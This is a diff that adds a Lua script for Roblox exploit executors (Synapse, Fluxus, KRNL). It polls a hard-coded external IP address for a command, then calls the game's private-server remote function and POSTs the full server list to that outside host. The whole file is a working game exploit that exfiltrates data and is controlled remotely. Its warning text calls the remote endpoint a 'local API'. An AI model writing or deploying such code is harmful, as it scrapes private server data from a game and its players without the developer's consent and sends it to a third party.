@@ -1,0 +1,91 @@
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+-- Remote function
+local GetServers = ReplicatedStorage:WaitForChild("PrivateServers"):WaitForChild("GetServers")
+
+local API_URL_STATUS = "http://157.245.80.25:5000/status"
+local API_URL_INFO = "http://157.245.80.25:5000/info"
+
+-- Detect which request function is available
+local request_func = syn and syn.request or http_request or fluxus and fluxus.request or krnl_request or request
+
+if not request_func then
+    warn("No HTTP request function available in this executor.")
+    return
+end
+
+-- A helper function to format nested tables into a readable string.
+local function formatTable(tbl)
+    local parts = {}
+    for key, value in pairs(tbl) do
+        local formatted_value
+        if type(value) == "table" then
+            -- For nested tables, recursively format them.
+            formatted_value = "{ " .. formatTable(value) .. " }"
+        else
+            -- For other types, convert to a string.
+            formatted_value = tostring(value)
+        end
+        table.insert(parts, tostring(key) .. ": " .. formatted_value)
+    end
+    return table.concat(parts, ", ")
+end
+
+while wait(1) do
+    -- Part 1: Check the status using the custom request function
+    local success, response = pcall(function()
+        return request_func({
+            Url = API_URL_STATUS,
+            Method = "GET"
+        })
+    end)
+
+    if success and response.Success then
+        -- Attempt to parse the JSON response
+        local statusData = HttpService:JSONDecode(response.Body)
+        
+        -- Check if the 'run_now' key is true
+        if statusData.run_now == true then
+            print("Received signal from API. Getting server list...")
+            local server_list_text = ""
+            
+            -- Invoke remote to get all servers
+            local servers = GetServers:InvokeServer()
+
+            -- Iterate over each server and format all info into a string
+            for serverId, serverData in pairs(servers) do
+                server_list_text ..= "Server ID: " .. serverId .. "\n"
+                
+                -- Iterate through every key-value pair in the serverData table
+                for key, value in pairs(serverData) do
+                    local formatted_value = tostring(value)
+                    if type(value) == "table" then
+                        -- Use the new helper function for nested tables
+                        formatted_value = formatTable(value)
+                    end
+                    server_list_text ..= "  " .. key .. ": " .. formatted_value .. "\n"
+                end
+                
+                server_list_text ..= "------------------------\n"
+            end
+            
+            -- Part 2: Send the formatted string back to the API using a POST request
+            local json_body = HttpService:JSONEncode({ server_list_text = server_list_text })
+
+            request_func({
+                Url = API_URL_INFO,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = json_body
+            })
+            
+        end
+    else
+        -- This block handles errors, like if the API server isn't running
+        warn("Failed to connect to the local API. Make sure the local_api.py script is running.")
+    end
+end
